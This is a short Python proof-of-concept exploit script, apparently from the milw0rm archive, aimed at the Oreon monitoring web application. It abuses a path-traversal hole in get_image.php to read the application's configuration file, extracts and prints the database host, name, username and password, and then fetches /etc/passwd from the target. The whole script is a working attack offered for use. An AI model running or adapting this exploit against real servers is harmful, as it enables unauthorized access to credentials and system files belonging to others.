#!/usr/bin/python

# Date : 20/01/2008
# Author : Julien CAYSSOL <julien@aqwz.com>

import sys, urllib2,re


user_agent =  'Mozilla/6.0 (compatible; MSIE 6.0; Windows NT)'
headers =  { 'User-Agent'  : user_agent ,
                                'Accept-Charset' : 'ISO-8859-15' }


if __name__ == "__main__":

    if len(sys.argv)==2:
        host = sys.argv[1]
        print " [+] Host : " + host

        url = "http://"+sys.argv[1]+"/include/doc/get_image.php?lang=&img=../../www/oreon.conf.php"
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        html = re.sub('\n','',html)
        ident =re.findall('\$conf_oreon\[\'host\'\] = "(.*?)";\$conf_oreon\[\'user\'\] = "(.*?)";\$conf_oreon\[\'password\'\] = "(.*?)";\$conf_oreon\[\'db\'\] = "(.*?)";',html)
        print " [*] Result :  "
        print " + DB Host : "+ident[0][0]
        print " + DB Name : "+ident[0][3]
        print " + DB user : "+ident[0][1]
        print " + DB pass : "+ident[0][2]

        print " [*] /etc/passwd for Fun"
        url = "http://"+sys.argv[1]+"/include/doc/get_image.php?lang=&img=../../../../../etc/passwd"
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        print html

    else:
        print "./Poc.py HOST"

# milw0rm.com [2008-02-28]